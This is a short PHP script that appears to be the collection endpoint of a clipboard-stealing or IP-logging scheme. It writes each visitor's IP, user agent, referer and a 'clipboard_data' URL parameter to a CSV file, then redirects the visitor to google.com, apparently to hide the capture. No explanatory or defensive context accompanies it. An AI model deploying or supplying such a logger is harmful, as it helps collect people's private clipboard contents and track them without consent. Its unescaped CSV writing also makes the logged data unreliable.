<?php
date_default_timezone_set('Europe/Berlin');

$logFile = 'access_logs.csv';

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $ip_list = explode(',', $ip);
    return trim($ip_list[0]);
}

$time = date('Y-m-d H:i:s');
$ip = get_real_ip();
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
$userAgent = str_replace(array("\n", "\r", ","), ' ', $userAgent);
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';

$clipboard_data = isset($_GET['clipboard_data']) ? $_GET['clipboard_data'] : 'N/A';
$clipboard_data = str_replace(array("\n", "\r", ","), ' ', $clipboard_data);

$logEntry = "\"$time\",\"$ip\",\"$userAgent\",\"$referer\",\"$clipboard_data\"\n";

if (!file_exists($logFile) || filesize($logFile) == 0) {
    file_put_contents($logFile, "Time,IP,User-Agent,Referer,Clipboard-Data\n");
}

file_put_contents($logFile, $logEntry, FILE_APPEND);

header('Location: https://google.com', true, 303);
exit;
?>

